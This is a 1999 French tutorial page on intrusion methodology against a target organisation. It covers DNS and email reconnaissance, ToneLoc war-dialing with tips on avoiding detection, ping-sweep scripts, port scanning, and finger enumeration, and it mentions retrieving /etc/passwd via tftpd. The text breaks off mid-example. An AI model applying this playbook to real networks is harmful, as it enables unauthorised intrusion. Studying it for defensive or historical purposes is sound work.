

<head>
<title></title>
</head>

<body>

<center>
<table width="600">
  <tbody>
    <tr>
      <td>
        <p align="left">Recoupement d'informations : <a href="mailto:cakeii@yahoo.com">cakeii</a><br>
        Validation et correction(s): <a href="mailto:tobozo@biosys.net">tobozo</a><br>
        Dernière mise a jour : 04-aout-99<br>
        no© <a href="http://come.to/legang">Serial Savate System</a></p>
      </td>
      <td>
        <p align="right">Intrusion et securite<br>
        Ce texte a ete créé<br>
        a partir d'archives<br>
        trouvées sur le net</p>
      </td>
    </tr>
    <tr>
      <td colspan="2"><br>
        <center>
        <h1>Intrusion</h1>
        </center><font size="+2">
        <p align="justify"><b>C</font></b>e document a pour but de vous initier
        à l'intrusion dans un système informatique et ce, dans un but purement
        éducatif. On considère ici que l'intrusion est un pas a franchir dans
        le chemin qui mène a la notion de sécurité informatique.
        <ul>
          <li>
            <p align="justify">Vous n'y trouverez aucune formule magique pour
            modifier votre compte bancaire ou hacker un site web ...</p>
          <li>
            <p align="justify">Nous précisons que le terme <i>hacker</i> est
            employé dans un contexte d'exploration et de découverte et non pas
            dans un contexte médiatique ou législatif.</p>
          <li>
            <p align="justify">Ce document n'a pas la prétention de tout
            connaître, d'ailleurs nous attendons de votre part des remarques et
            des suggestion, sa vie est de courte durée, au vu de l'intense
            activité qui se déroule actuellement dans ce secteur. C'est
            pourquoi il sera mis a jour a chaque nouvelle information que nous
            recevrons.</p>
          </li>
        </ul>
        <font size="+2">
        <p align="justify"><b>D</font></b>epuis quelques temps, c'est la
        sérénade dans la presse informatique et nationale sur les nouveaux <i>'hackers'</i>,
        pardon <i>'consultants en sécurité'</i> serait plus adéquat, qui font
        des essais d'intrusions, ils sont rémunérés pour hacker et tester la
        sécurité informatique ! Derrière le terme <i>'hacker'</i> il y a des
        compétences en techniques simples : une bonne connaissance de
        l'informatique TCP/IP, Unix, un ou deux langages de programmation (de
        préférence C et Perl) et un esprit souple.<font size="+2">
        <p align="justify"><b>L</font></b>a Technique de l'intrusion demande
        surtout de savoir lire les faq des groupes de hackers américains,
        puisqu'il n'en existe pas réellement en français. Pour le plaisir des
        petit et des grands, nous allons découvrir le monde merveilleux de
        l'intrusion.<br>
        <hr>
        <br>
        <h2><b>Approche</h2>
        </b>Notre approche consiste à attaquer selon 3 axes et en 3 phases. Les
        3 axes :
        <ul>
          <li><b>RTC</b> pour détection de porteuse et de modems non déclarés
          <li><b>X25</b> pour essayer de trouver des accès gros systèmes SNA/DSA
            ou decnet, ou des routeurs IP/X25
          <li><b>Internet</b> pour détecter les points d'entrée</li>
        </ul>
        Les 3 phases outre une phase de récupération d'outils doivent
        permettre :
        <ol>
          <li>la récupération d'un maximum d'adresses IP, de numéros de
            téléphone, de numéro X25, d'adresses e-mail, etc. et d'infos de
            configurations (voir hackoff3 sur le 'Social Engineering')
          <li>l'utilisation des infos recueillies lors de la phase 1 pour
            accéder à des machines et/ou des réseaux de la victime
          <li>l'attaque des machines</li>
        </ol>
        <br>
        <hr>
        <br>
        <h2><b>Préliminaire : Le matos</h2>
        </b>
        <p align="justify">Il faut disposer des équipements suivants :
        <ul>
          <li>un modem RTC classique,
          <li>une carte X25/X32, l'abonnement correspondant, les couches TCP/IP,
            PAD, etc. ainsi qu'un kit de développement TCP,
          <li>une carte NUMERIS</li>
        </ul>
        Pour les OS, de LINUX ou de FreeBSD.<br>
        Pour les OS Win32, les soft pour le hack sont sous dimensionnés, donc
        on utilisera plutôt Win 3.11 ou Linux.<br>
        <hr>
        <br>
        <h2><b>Phase 0 : récupération d'outils et configuration des machines</h2>
        </b>
        <p align="justify">Les outils sont différents selon les axes d'attaques
        et selon l'OS utilisé pour l'attaque. Il est évident que UNIX est l'OS
        le plus simple pour réaliser ce type d'opération car la
        quasi-totalité des outils sont standards et peuvent être automatisés
        dans un shell script.
        <p align="justify">Attention : Autant, il est &quot; facile &quot; de
        communiquer vers un provider sous W3, W95 et Windows NT, autant cela
        n'est pas simple sous LINUX.
        <p align="justify">&nbsp;
        <p align="justify"><b>
        <h3>Axe RTC</h3>
        </b>
        <p align="justify">Outils standard
        <p align="justify">&nbsp;
        <table border="1">
          <colgroup>
            <col span="2">
          <tbody>
            <tr>
              <td>Emulateur de terminal</td>
              <td>Chez <a href="http://www.tucows.com/">http://www.tucows.com/</a></td>
            </tr>
            <tr>
              <td>Emulateur Minitel</td>
              <td>En general fourni avec le modem (voir site constructeur)</td>
            </tr>
          </tbody>
        </table>
        <p align="justify">Outils spécifiques
        <p align="justify">&nbsp;
        <table border="1">
          <colgroup>
            <col span="2">
          <tbody>
            <tr>
              <td>Dialer TONELOC</td>
              <td>Automate d'appel d'une plage de numéro et détection de
                porteuse (fax ou modem)</td>
            </tr>
            <tr>
              <td>Dialer NUAA</td>
              <td>Automate d'appel de réseau X25 en particulier SprintNet.</td>
            </tr>
            <tr>
              <td>Pabxhack</td>
              <td>Comme son nom l'indique, outil de hacking de pabx.</td>
            </tr>
          </tbody>
        </table>
        <p align="justify">Dispo en telechargement sur des sites underground
        repondant au mot-clé <i>phreaking</i> dans les moteurs de recherche.<br>
        <hr>
        <br>
        <b>
        <h2>Phase 1 : récupération d'informations</h2>
        </b>
        <p align="justify"><b>
        <h4>Principe de base</h4>
        </b>
        <p align="justify">Ce qui distingue cette phase de la suivante, c'est
        que toutes les opérations réalisées sont totalement licites. Il ne
        s'agit que de récupération d'informations disponibles sur Internet ou
        ailleurs. Seules certaines récupérations et l'usage de TONELOC (appels
        des plages d'un autocom) sont limites.
        <h4><b>Source d'informations &quot;ponctuelles&quot;</b></h4>
        <p align="justify">Les sources d'informations ponctuelles peuvent être
        multiples (carte de visite obtenues de différentes manières (visite
        commerciale chez la victime, annuaire, Minitel, informations recueillies
        par echanges, etc.). Elles ont pour objectif de récupérer :
        <p align="justify">&nbsp;
        <ul>
          <li>des numéros de téléphone (même préfixe Tel et Fax ==&gt;
            Plage de n° PABX pour le dialer)
          <li>des adresses E-Mail ( connectivité internet + nom de domaine)
          <li>des adresses Internet (nom de machines et @IP)
          <li>des adresses X25 (C'est la seule source pour les @X25)
          <li>des informations plus générales sur la victime, ses
            interconnexions, etc.</li>
        </ul>
        <b>
        <h3>Source d'informations techniques</h3>
        </b>
        <p align="justify"><b>
        <h4>Axe Internet</h4>
        </b>
        <p align="justify">Les sources d'informations techniques peuvent être
        soit immédiatement obtenues par des informations &quot;publiques&quot;
        sur la victime (son nom, le nom de ses filiales, etc.) soit itérées en
        fonction des résultats du chapitre précédent.
        <p align="justify"><b>
        <h4>Récupération d'informations par internet</h4>
        </b>
        <p align="justify">Récupération des adresses IP officielles dans
        l'annuaire DNS avec &quot;whois&quot;, &quot;nslookup&quot; et &quot;dig
        &quot;. Utilisation des vecteurs classiques (moteurs de recherche, news
        via www.dejanews.com, email via www.four11.com, etc.) pour obtenir des
        domaines de messagerie ou des serveurs web.
        <p align="justify">1. L'annuaire DNS mondial<br>
        <ul>
          <ul>
            <li>Whois<br>
              <br>
              Whois est une couche réseau qui exploite les tables DNS. On
              interroge tout d'abord la table internic (rs.internic.net) puis si
              nécessaire d'autres serveurs . L'outil &quot;whois&quot; est
              disponible sous Linux (filewatcher.org)<br>
              Avec cet outil, on peut :
              <ul>
                <li>lui passer une chaine de caractère et il vous sort la liste
                  des noms de domaine DNS commencant par cette chaine de
                  caractère . A partir de ces noms de domaines, il faut faire
                  une seconde recherche pour avoir des informations plus
                  précises,
                <li>lui passer une adresse de réseau de classe C, B ou même A
                  (192.93.10.0 ou 141.29.0.0 par exemple) pour savoir à qui
                  elle est allouée.</li>
              </ul>
            </li>
          </ul>
          <p align="justify">Un nombre important d'adresses IP européennes est
          aujourd'hui gérée par le RIPE. Le serveur &quot;whois.ripe.net&quot;
          permet de récupérer des infos mais il n'est pas aussi souple sur les
          caractères de substitutions que celui d'internic.
          <p align="justify">mettre un exemple de whois
          <p align="justify">Selon les cas, on trouve soit des adresses IP de
          réseau (le pied) soit des noms de réseaux. Si on obtient des noms de
          réseaux uniquement, il y a de forte chance pour que le site ne soit
          pas directement connecté à internet mais uniquement via un provider
          et en connexion à la volée
          <p align="justify">A contrario, ce n'est pas parce que l'on obtient
          une adresse IP que la société est réellement connectée sur
          Internet. Elle peut avoir simplement réservé cette adresse pour un
          usage futur.
          <p align="justify">On doit donc utiliser dans cet outil :
          <ul>
            <li>le nom de la société et de ses filiales (ou des noms
              intermédiaires),
            <li>les noms de réseaux et de machines identifiés lors de la phase
              de récupération d'informations ponctuelles (e-mail, news, etc.),
            <li>les adresses de classe C ou B pour savoir à qui elles
              appartiennent (en les suffixant de 1 ou de 2 zéro.)</li>
          </ul>
          L'usage de l'outil est bien entendu récurant en fonction des
          nouvelles infos dont on peut disposer.
          <p align="justify">Remarque :<br>
          Dans certains cas lorsque l'on cherche à qualifier l'appartenance
          d'une classe C ou d'une classe B, le site standard (rs.internic.net)
          nous fournit des plages d'adresses en précisant que ces plages ont
          été allouées à des organismes autres (plages RIPE en europe par
          exemple). Dans la plupart de ces cas, il est précisé un autre site
          qui donnera des informations complémentaires (whois.ripe.net par
          exemple).
          <p align="justify">&nbsp;
          <ul>
            <li>Netfind</li>
          </ul>
          Netfind est un outil disponible sur le site internic et accessible en
          HTTP via une URL gopher. Netfind permet d'effectuer des recherches sur
          les domaines de messagerie. Ces recherches sont complémentaires de
          celles réalisées avec Whois. L'URL à accéder est :
          <p align="justify"><a href="gopher://ds1.internic.net:4320/7netfind%20dblookup">gopher://ds1.internic.net:4320/7netfind%20dblookup</a>
          <p align="justify">C'est une couche réseau qui exploite les tables
          DNS. On interroge tout d'abord la table internic (rs.internic.net)
          puis si nécessaire d'autres serveurs .
          <p align="justify">&nbsp;
          <ul>
            <li>Nslookup</li>
          </ul>
          &quot;nslookup&quot; est l'outil de base UNIX pour récupérer des
          informations au travers de DNS lorsque l'on connait le nom DNS de la
          machine ou son adresse IP. Il permet d'obtenir différents types
          d'informations en paramétrant la demande. L'objectif de son usage est
          d'obtenir des adresses IP là ou whois nous avait donné des noms de
          réseaux d'une part et d'obtenir des informations permettant de
          relancer un whois sur les passerelles de messagerie identifiées dans
          les e-mail. &quot;nslookup&quot; est disponible sous plusieurs OS. Il
          est par contre rarement paramétrable sous Windows NT ou 95. J'utilise
          donc les versions Windows pour des requêtes simples et UNIX pour les
          requêtes plus détaillées. La requete de base nslookup permet de
          récupérer l'adresse IP d'une machine (ou d'un nom de réseau) dont
          on connaît le nom. Cela s'obtient sous unix en mode commande en
          lancant :
          <ul>
            <li>nslookup nom_de_machine</li>
          </ul>
          Nslookup permet d'autres informations en utilisant le paramétre
          &quot;-query&quot;. La commande est alors :
          <ul>
            <li>nslookup -query=xxxx nom_de_machine</li>
          </ul>
          ou xxxx peut prendre les valeurs (je ne détaille que celles que j'ai
          utilisées) :
          <p align="justify">&nbsp;
          <pre> A		valeur par défaut, adresse/nom DNS ou inverse

 MX		informations sur le serveur de messagerie (issu des e-mail)

 UINFO		information sur les utilisateurs (jamais de réponse !)

 HINFO		information sur le type de HOST (s'il est déclaré)

 MINFO		information sur le mail server et la mailbox (s'il y en a)

 WKS		les well-knowns servis sur la machine (s'ils sont déclarés)

 TXT		un texte complémentaire s'il en existe un

</pre>
          Les autres valeurs sont : CNAME, NS, PTR, SOA, AXFR, MB, MD, MF, ANY
          (qui ne marche pas). Pour plus de détail, cf. Man nslookup et
          rfc1035.
          <p align="justify"><b>Remarque :</b><br>
          nslookup renvoie soit une adresse IP (passage au point suivant), soit
          un message d'erreur du type &quot;host unknown'&quot;, la machine ou
          le réseau ne sont pas connecté sur internet, ou un message d'erreur
          du type &quot;no record Adress (A) dispo&quot;. Il s'agit alors très
          fréquemment d'une passerelle de messagerie dont on obtient les
          caractéristiques via le paramètre &quot;-query=mx&quot;.
          <p align="justify">&nbsp;</p>
        </ul>
        2. Les moteurs de recherches
        <ul>
          (liste trouvée par exemple à &quot;<a href="http://ireste.ireste.fr/moteurs/">http://ireste.ireste.fr/moteurs/</a>&quot;
          ou directement sur l'un des moteurs (www.yahoo.fr, www.lycos.com,
          etc.). On cherche alors le nom de la société pour identifier les
          endroits ou elle est citée sur le net. On obtient alors soit des noms
          de sites WEB, soit des noms ou des e-mail d'utilisateurs de la
          société.
        </ul>
        <p align="justify">3. Les news
        <ul>
          dans lesquelles des personnes de la société ont pu déposer des
          demandes ou effectuer des réponses. les news sont par exemple
          accessibles au travers d'un site web comme &quot;www.dejanews.com&quot;.
        </ul>
        <p align="justify">4. Les annuaires d'email.
        <ul>
          Aujourd'hui nous utilisons :
          <p align="justify">&nbsp;
          <ul>
            <li>www.four11.com qui permet de rechercher les utilisateurs ayant
              ne email par société (il y a un champ société dans la grille
              de saisie des paramétres de recherche). On obtient une liste d'emails
              dont on extrait le domaine :</li>
          </ul>
          <pre>Joseph Abdallah                            @lanl.gov
    CURRENT ORGANIZATION:  T-4 Atomic And Optical Theory
 Raj Acharya                                @vaxd.gat.com
    CURRENT ORGANIZATION:  General Atomics</pre>
          <ul>
            <li>&quot;<a href="http://www.nova.edu/Inter-Links/netfind.html">http://www.nova.edu/Inter-Links/netfind.html</a>&quot;
              permet d'obtenir la liste des domaines de messagerie d'une
              société en passant en paramètre &quot;* Nom_de_société&quot;.
              On obtient une liste des domaines d'email. Sous la forme :</li>
          </ul>
          Nom_du_domaine_de_messagerie Nom &amp; adresse de la société
          correspondante
          <ul>
            <li>une fois cette phase terminée, il faut retourner à la phase 1
              pour vérifier si les domaines de messagerie sont reliés à des
              domaines DNS (via whois) ou à des machines IP (nslookup standard)
              ou enfin à des passerelles de mail uniquement (via nslookup -query=mx).
              On qualifie ensuite toutes les adresses obtenues pour savoir si
              elles appartiennent ou non a la victime (whois sur l'adresse de
              réseau de classe B ou C).</li>
          </ul>
          Attention :<br>
          Les domaines d'email sont surement l'un des moyens les plus efficaces
          pour trouver des adresses gérées par des providers ou des sites qui
          n'ont pas le nom des sociétés de la victime dans leur nom.
        </ul>
        <p align="justify">&nbsp;
        <p align="justify"><br>
        <br>
        <h3><b>Axe RTC : Recherche de Modem</b></h3>
        <p align="justify">Utilisation du dialer MSDOS TONELOC pour détecter
        les porteuses de modems.
        <p align="justify">Une recherche de modem peut être envisagée dès
        lors que l'on connaît des numéros ou des plages de numéros
        correspondant à la société cible. Cette méthode ne garantit
        aucunement l'exhaustivité de la recherche puisque les modems sont
        souvent accessibles au travers de numéros analogiques qui ne sont pas
        gérés par le PABX. Une recherche plus efficace peut être envisagée
        en parcourant exhaustivement les plages utilisées sur le site
        géographique de la cible. Il est par contre impossible dans ce cas
        d'être sûr que les numéros sur lesquels une porteuse est détecté
        appartiennent bien à la cible. Cela pose un problème financier (si des
        particuliers sont appelés, ils décrocheront et la communication
        deviendra payante).
        <p align="justify"><b>Les contraintes</b>
        <p align="justify"><b>Le coût</b><br>
        Le coût d'un appel qui aboutit est a priori faible. Le nombre d'appels
        peut cependant conduire à un coût global important. Et ceci d'autant
        plus s'il s'agit d'appels longue distance. On peut dire qu'un appel
        aboutit dès lors qu'il y a décrochage à l'autre bout de la ligne :
        une personne, un modem ou un fax, un répondeur. La durée de la
        communication peut être variable suivant l'équipement qui décroche.
        Il est dans tous les cas probable qu'il y ait raccrochage avant
        d'atteindre une minute. Les communications vers certains pays peuvent
        quand même atteindre 20F / minute. Pour minimiser le coût, il est donc
        souhaitable d'avoir le moins possible de décrochages, et notamment de
        décrochages par des personnes (qui contrairement aux machines peuvent
        trouver ça louche). Ceci conduit à privilégier des compositions de
        nuit, ou de jour lorsqu'il n'y a personne , c'est à dire samedi,
        dimanche, ou les jours fériés.
        <p align="justify"><b>Le temps</b><br>
        Pour chaque numéro appelé, il faut compter le temps de composition du
        numéro, et le temps d'attente avant raccrochage (durée au bout de
        laquelle on estime qu'il n'y aura pas de réponse). Sur la base
        raisonnable d'une trentaine de secondes pour chaque numéro, il est
        possible de composer une centaine de numéros à l'heure, soit de
        l'ordre de 1200 numéros entre 19h et 7h.
        <p align="justify"><b>garantie de résultat</b><br>
        L'exhaustivité des identifications (dans la limite des plages
        auxquelles on applique la recherche) est dépendante
        <ul>
          <li>de la bonne détection de l'éventuel plantage du modem
          <li>du fait que les modems que l'on recherche ne sont pas éteints
            manuellement (extinction), automatiquement (programmation horaire de
            l'alimentation électrique) ou logiciellement (programmation du
            modem par la machine à laquelle il est relié pour qu'il ne
            réponde pas aux appels),
          <li>de la configuration nocture du PABX, qui peut en fonction de
            l'heure dérouter les appels vers le standard (pour toutes les
            lignes ou pour certaines seulement), ou rendre certains numéros
            inaccessibles.</li>
        </ul>
        <b>Indications :</b><br>
        Les numéros correspondant à des fax (notamment celui que l'on trouve
        avec le numéro du standard) peuvent donner des plantage du modem. C'est
        relativement aléatoire puisque l'on ne peut préjuger de quand ces
        numéros seront composés, et quand on aura des problèmes de
        détection.
        <p align="justify"><b>
        <h4>Utilisation de toneloc</h4>
        </b>
        <p align="justify">Ce programme sait gérer le parcours automatique de
        plages de numéros, en identifiant des porteuses ou des tonalités. La
        deuxième fonctionnalité est probablement inintéressante en France, au
        moins dans notre contexte. Une présentation rapide du paramétrage de
        ce produit est fournie en annexe 1.
        <p align="justify"><b>Caractéristiques</b><br>
        La définition d'une plage est faite en adjoignant un ou plusieurs X à
        un préfixe, et en spécifiant pour les chiffres manquants des valeurs
        de départ et de fin. Il est possible de définir des contraintes
        horaires pour l'exécution de toneloc. Les commutateur /s et /e
        permettent en effet de définir une heure de début et une heure de fin.
        Toneloc lancé avec l'option /s attendra l'heure spécifiée pour
        composer le premier numéro, sauf si la touche Esc est tapée. Le
        programme arrêtera de composer des numéros dès qu'il aura dépassé
        l'heure spécifiée avec le commutateur /e, et ne composera aucun
        numéro s'il est lancé alors que cette heure est dépassée. Attention
        cependant au cas où l'on spécifie une heure d'arrêt dans la matinée
        pour un programme lancé le soir. Il semble en effet que, l'heure
        nocturne étant postérieure à l'heure d'arrêt (prise dans la même
        journée), que le programme ne se soit pas exécuté plusieurs fois.
        Toneloc sait prendre en compte une liste noire dans laquelle on
        recensera les numéros qui ne doivent pas être composés (celui du
        standard pourrait y être mis systématiquement, ce qui évite qu'un
        gardien ne s'étonne la nuit) Le parcours peut être incrémental ou
        aléatoire, cette seconde option réduisant les risques de détection
        (cela aura tendance à sonner dans n'importe quel endroit du site, et
        pas deux fois de suite sur des postes situés au même endroit). La
        configuration de Toneloc est gérée par un outil tlcfg. On y configure
        notamment les chaînes d'initialisation du modem, le numéro de port
        utilisé, le délai avant raccrochage et le format plus ou moins prolixe
        d'enregistrement des connexions réussies.
        <p align="justify">Toneloc produit trois fichiers différents lorsqu'il
        s'exécute (dans le meilleur des cas, c'est à dire lorsqu'il a trouvé
        des porteuses, sinon deux fichiers seulement). Ce sont :
        <ul>
          <li>tone.log : log des essais, avec en-tête, notification des
            porteuses éventuelles, et bilan,
          <li>found.log : enregistrement de ce qu'envoie le modem distant
            (bannière par exemple) sans, puis avec titillement (envoi de
            caractères par toneloc), des caractéristiques de la connexion, et
            le cas échéant du nombre de secondes écoulées avant coupure de
            la communication
          <li>préfiXXX.dat, au format binaire, qui permet une visualisation par
            tonemap des résultats concernant la plage parcourue, et qui est
            utilisé par toneloc pour ne pas recomposer un numéro déjà
            appelé.</li>
        </ul>
        Lorsque ces fichiers existent déjà, toneloc ajoute à la fin des .log,
        et complète le contenu du .dat
        <p align="justify"><b>Limitations de toneloc :</b><br>
        <ul>
          <li>Il a été constaté que toneloc ne détecte pas les porteuses de
            certains fax. le faible nombre de modems recensés pourrait laisser
            penser qu'il en va de même pour les porteuses de certains modems.
          <li>Les capacités de détection sont clairement dépendantes des
            caractéristiques du modem utilisé (un modem V32 ne détectera pas
            bien la modulation d'un V34bis si ce dernier ne connecte qu'à 33600
            bps).
          <li>Indépendamment de cela, il n'est pas impossible que les
            détections soient fonction du modèle de modem utilisé. De ce
            fait, l'utilisation de modems différents pourrait permettre un
            meilleur recensement, au prix toutefois d'un multiple parcours des
            plages.
          <li>L'existence de numéros à taille variable dans certains pays,
            comme l'Allemagne, pose un problème avec toneloc.
          <li>Il semble que le programme de fusion de deux .DAT relatifs à la
            même plage ne soit pas complètement fonctionnel. Il faut donc
            réutiliser les mêmes .DAT lorsque l'on parcourt des plages
            contiguës.</li>
        </ul>
        <b>Choix des plages</b><br>
        Si l'on connaît un préfixe, il faut être particulièrement méfiant.
        La cible ne détient pas forcément tous les numéros correspondant à
        toutes les valeurs de suffixe. Il faut dans ce cas valider manuellement
        en procédant par encadrement de la plage. Si l'on dispose d'un ensemble
        de numéros (tirés d'un annuaire), il faut vérifier qu'ils partagent
        un même préfixe, puis rechercher les plus grand et plus petit numéros
        alloués. On en déduit alors une plage en arrondissant au dessus et au
        dessous. Cette plage est alors très sûre (sauf si elle se fonde sur
        des informations périmées), mais peut très bien ne constituer qu'une
        fraction de la véritable plage gérée par l'autocommutateur. dans tous
        les cas, il est intéressant de valider la faisabilité de la recherche
        sur cette plage
        <p align="justify"><b>Astuces sans garantie</b>
        <p align="justify">&nbsp;
        <ol>
          <li>privilégier les jours fériés car il est plus vraisemblable
            qu'il ne soient pas gérés différemment des jours ouvrés par le
            PABX
          <li>privilégier les périodes de vacances.</li>
        </ol>
        <b>Exemple de résultat d'un TONELOC</b><br>
        Les informations sont obtenues suite aux passages de l'outil TONELOC
        pour détecter des porteuses. On détecte donc un certain nombre de
        modem qui répondent. Le résultat typique d'un toneloc est :<br>
        04:26:10 &quot;<br>
        04:26:10 ToneLoc v1.10 (Sep 29 1994)<br>
        04:26:10 ToneLoc started on 13-Mar-97<br>
        04:26:10 Using COM1 (16450 UART)<br>
        04:26:10 Data file: 011234567X.DAT<br>
        04:26:10 Config file: TL.CFG<br>
        04:26:10 Log file: TONE.LOG<br>
        04:26:10 Mask used: 011234567X<br>
        04:26:10 Range used: 0-9<br>
        04:26:10 Scanning for: Carriers<br>
        04:26:10 Initializing Modem ... Done<br>
        04:28:21 0112345675 - Timeout (3)<br>
        04:29:01 0112345670 - Timeout (0)<br>
        04:27:32 0112345671 - * CARRIER *<br>
        04:28:21 0112345674 - Timeout (3)<br>
        04:29:01 0112345676 - Timeout (0)<br>
        04:28:21 0112345672 - Timeout (3)<br>
        04:29:01 0112345679 - Timeout (0)<br>
        04:29:01 0112345673 - Timeout (0)<br>
        04:28:21 0112345678 - Timeout (3)<br>
        04:29:01 0112345677 - Timeout (0)<br>
        <br>
        On y détecte donc un modem sur le n° 0112345671
        <p align="justify">A l'issu de ce travail (souvent répétitif environ
        10000 appels pour 6 modems par exemple), on dispose donc de porteuses de
        modem(s). Ces porteuses vont pouvoir ensuite être accédées pour
        vérifier si le modem accepte les connexions entrantes.
        <p align="justify">&nbsp;
        <p align="justify"><br>
        <br>
        <b>
        <h3>Axe X25</h3>
        </b>Nous ne disposons pas de moyens technique pour récuperer des @X25.
        Donc à ce niveau le Social engineering prend toute son importance.<br>
        <hr>
        <br>
        <b>
        <h2>Phase 2 : Exploitation des informations recueillies</h2>
        </b>
        <p align="justify"><b>
        <h4>Principe de base</h4>
        </b>
        <p align="justify">Attention, à partir de cette phase, toutes les
        opérations effectuées peuvent être interprétées à la limite comme
        une tentative d'intrusion. Elles ne sont par contre pas vraiment
        punissables par la loi.
        <p align="justify"><b>Axe Internet</b>
        <p align="justify">On dispose à l'issue de la phase 1 d'adresse IP de
        réseau ou de machines.
        <ol>
          <li>vérifier qu'elles sont actives et qu'elles donc répondent au
            ping</li>
        </ol>
        <ul>
          <li>Ping</li>
        </ul>
        Résumé : ping limité (-c x) sur toutes les adresses<br>
        l'outil ping est disponible sous UNIX et dans les autres OS.<br>
        Je l'utilise plutôt sous UNIX car il est plus facile de le paramètrer.
        Nous avons bricolé des outils qui permettent de grouper les ping. Ils
        sont à la base des shell-scripts. Nous avons deux versions :
        <ul>
          <li>Une version très rapide et simple. On crée une liste d'adresse
            sous vi, puis on écrit un mini-shell du type :</li>
        </ul>
        <pre> for i in `$1`
 do
    ping -c 2 $i &gt;&gt; resultat &amp;
    sleep 1
 done</pre>
        <p align="justify">Son principal inconvénient est de ne pas trier les
        résultats et de ne pas générer le fichier de base des adresses.
        <p align="justify">&nbsp;
        <ul>
          <li>L'autre version, elle necessite la présence dans le répertoire
            courant d'un fichier 1-255 contenant 255 lignes numérotées de 1 à
            255. Elle prend en paramétre le nom du fichier résultat et de la
            plage d'adresse à analyser. Elle s'appuie sur un shell script du
            type :</li>
        </ul>
        <pre> echo &quot; &quot;           &gt;  $1
 for i in `1-255`
 do
    echo $2.$i      &gt;&gt; $1
    ping -c 2 $2.$i &gt;&gt; $1
 done</pre>
        <p align="justify">Son principal inconvénient est de devoir être
        lancée en arriere plan pour gagner du temps et de générer un fichier
        résultat par adresse de classe C. Les différentes variantes sont
        liées soit à un niveau de détail dans le ping (-c 10, -d, etc.), soit
        dans l'affichage des informations à l'écran avant de les stocker dans
        le fichier résultat (| tee -a ...)
        <p align="justify"><b>ATTENTION</b>, les schells scripts lancés en
        arrière plan ne doivent pas afficher de message donc eviter celui
        contenant les &quot;tee&quot;.
        <p align="justify">L'exploitation des résultats peut-être réalisé
        soit à la main en visualisant le fichier (fastidieux) soit par des
        greps +/- automatisés. Je me suis arrêté à une suite de grep du
        style :
        <ul>
          <li>grep &quot; 0%&quot; $1
          <li>grep &quot; 20%&quot; $1
          <li>grep &quot; 40%&quot; $1
          <li>grep &quot; 50%&quot; $1
          <li>grep &quot; 60%&quot; $1
          <li>grep &quot; 80%&quot; $1</li>
        </ul>
        qui affiche si une ligne de résultat est différente du classique
        &quot;packet lost 100%&quot;. Il faut alors se réferer au contenu du
        fichier pour savoir laquelle. Si un Kador du shell-script et du sed/awk
        fait mieux, merci. Les pourcentages possibles dépendent bien entendu du
        paramétre -c qui précise le nombre de paquets que l'on essaye de
        lancer avant de passer à l'adresse suivante. Je me suis basé sur 2
        paquets, ce qui parait suffisant.
        <p align="justify">A la fin de cette phase, on est normalement à même
        de savoir si certaines machines de la victime sont accessibles sur
        Internet.
        <p align="justify">Attention, si une machine répond sur un
        sous-réseau, il est intéressant de repasser le ping sur toute la plage
        plusieurs fois. En effet, certaines machines peuvent ne pas avoir été
        branchées lors du premier passage ou n'avoir pas répondu à cause du
        time-out faible. Il faut également tenir compte du décalage horaire si
        nécessaire.
        <p align="justify">2.Regarder quels sont les services réseaux
        accessibles sur ces machines.
        <p align="justify">&nbsp;
        <h3><b>Les outils d'intrusion</h3>
        </b>
        <p align="justify">tcp_scan et udp_scan sur les machines actives pour
        identifier les services disponibles Utilisation des couches actives
        publiques pour recueillir des informations (rpc, nfs, finger, ftp
        anonyme, smtp via telnet sur le port 25, etc.)
        <p align="justify">Cette opération peut s'effectuer à la main ou à
        l'aide d'outils complets comme SATAN, Nessus ou NMAP.
        <ul>
          <li>recherche des ports accessibles (tcp_scan et udp_scan).</li>
        </ul>
        Ces outils ne sont disponibles que sous UNIX. A priori, j'utilise les
        outils fournis avec SATAN et compilés sous LINUX. Ils sont stockés
        dans le répertoire bin de satan. On lance dont sur chacune des adresses
        de machine :
        <ul>
          <li>tcp_scan @IP_machine 1-65535 &gt; resultat_machine
          <li>udp_scan @IP_machine 1-65535 &gt;&gt; resultat_machine</li>
        </ul>
        <pre> On obtient alors la liste des services actifs tant en tcp 
 qu'en udp sous une forme du type :
 80:http
 23:telnet
 ...
 Certains services sont particuliérement utiles. 
 Il s'agit dans un premier temps de :
 69 : tftpd qui peut parfois permettre de récupérer
            le fichier /etc/passwd (récupérable uniquement
            avec udp_scan
 79 : fingerd qui permet d'obtenir des informations
            sur le site et les utilisateurs connectés
 80 :	httpd qui signifie que le site dispose d'un site web.
            L'accès à ce site web est un des moyens le plus sûr 
            de s'assurer que l'on attaque bien le bon site.
 111 : Le port mapper, la machine accepte des appels RPC 
            (NFS, YP, etc. sont interessants pour la suite)</pre>
        <p align="justify">Dans un second temps, des services comme smtp, telnet,
        ftp et rlogin permettent de se connecter à la machine.
        <ul>
          <li>recherche d'informations si un port 79 (finger) est présent :</li>
        </ul>
        Finger est une couche haute sur TCP qui permet de recueillir des
        informations sur les utilisateurs d'une machine. La partie cliente de
        finger est disponible sous la totalité des OS. J'utilise soit la
        version UNIX avec la possibilité de l'automatiser dans un shell-script
        (je n'en ai pas écrit pour cette fonction mais ça peut venir) et
        l'outil &quot;iefinger&quot; sous Windows 3.11 qui permet de lancer un
        batch sur plusieurs adresses. Dans un premier temps, on lance finger
        pour obtenir la liste des utilisateurs connectés sur la machine :
        <ul>
          <li>finger @IP_machine</li>
        </ul>
        on obtient une liste du type :
        <p align="justify">&nbsp;
        <pre> Welcome to Linux version 2.2.7 at rasta.legang.fr !
 
   3:05pm  up 5 min,  3 users,  load average: 0.16, 0.13, 0.08
 
 Login       Name               TTY         Idle    When    Where
 toto     -  albert	      console        1  Thu 12:37  :0                  
 titi     -  Titi rené         pts/2         13 Mon 09:04  192.93.xxx.xxx      
 demo     -  Demonstration     pts/4         18 Mon 09:09  192.93.yyy.yyy      
 ...
</pre>
        On y trouve les infos suivantes :<br>
        <ul>
          <li>Le nom d'utilisateurs déclarés dans le /etc/hosts sur la
            machine,
          <li>les machines a partir desquelles ils sont capables de communiquer
            avec la machine (ce qui nous donne d'autres @IP et donc une
            indication sur la connectivité de la machine vers un réseau
            interne et de nouvelles cibles =&gt; retour au nslookup pour les
            qualifier puis au ping),
          <li>des infos complémentaires parfois sur le type de machine (linux)
            son nom DNS/interne (rasta.legang.fr) , etc.</li>
        </ul>
        Dans un second temps, on lance finger pour obtenir des informations sur
        les utilisateurs eux-même :
        <p align="justify">&nbsp;
        <ul>
          <li>finger nom_user@IP_machine</li>
        </ul>
        On obtient une liste du type :
        <p align="justify">&nbsp;
        <pre>Welcome to Linux version 2.0.0 at rasta.legang.fr !
 
